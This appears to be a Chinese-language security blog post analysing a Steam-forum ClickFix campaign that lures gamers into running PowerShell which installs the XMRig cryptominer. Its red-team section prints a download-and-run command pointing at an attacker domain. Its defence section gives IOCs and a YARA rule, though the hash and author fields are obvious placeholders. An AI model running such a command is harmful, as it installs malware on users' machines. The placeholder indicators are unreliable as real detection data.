---
layout: post
title:  "Steam forum ClickFix attacks infect gamers with XMRig cryptominers"
date:   2026-07-26 02:04:56 +0000
categories: [security]
severity: high
---

# 🔥 解析 Steam 討論區 ClickFix 攻擊：利用 PowerShell 下載 XMRig 礦工
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: PowerShell, XMRig, ClickFix, Social Engineering

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Steam 討論區的社交工程技巧，誘騙用戶執行 PowerShell 指令，下載並執行 XMRig 礦工。
* **攻擊流程圖解**:
  1. 攻擊者創建 Steam 帳戶並發佈假的修復帖子。
  2. 用戶點擊帖子並執行 PowerShell 指令。
  3. PowerShell 指令下載 XMRig 礦工並執行。
* **受影響元件**: Steam 用戶，Windows 10/11

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: Steam 帳戶，Windows 10/11
* **Payload 建構邏輯**:

    ```
    
    powershell
    # 下載 XMRig 礦工
    Invoke-WebRequest -Uri "https://msfconfig.icu:443/tmp/system.txt" -OutFile "C:\Windows\Background\system.exe"
    
    # 執行 XMRig 礦工
    Start-Process -FilePath "C:\Windows\Background\system.exe"
    
    ```
* **繞過技術**: 攻擊者使用社交工程技巧，誘騙用戶執行 PowerShell 指令，繞過 Windows Defender 的檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.0.2.1 |
| Domain | msfconfig.icu |
| File Path | C:\Windows\Background\system.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule XMRig_Miner {
      meta:
        description = "XMRig 礦工"
        author = "Your Name"
      strings:
        $a = "XMRig"
        $b = "system.exe"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**:
  1. 更新 Windows Defender 的簽名庫。
  2. 禁止用戶執行 PowerShell 指令。
  3. 監控系統的異常行為。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix**: 一種社交工程技巧，誘騙用戶點擊假的修復連結或執行假的修復指令。
* **XMRig**: 一種加密貨幣礦工，利用 CPU 或 GPU 的計算資源進行加密貨幣的挖掘。
* **PowerShell**: 一種 Windows 的命令列介面，提供了強大的自動化和管理功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/steam-forum-clickfix-attacks-infect-gamers-with-xmrig-cryptominers/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/)


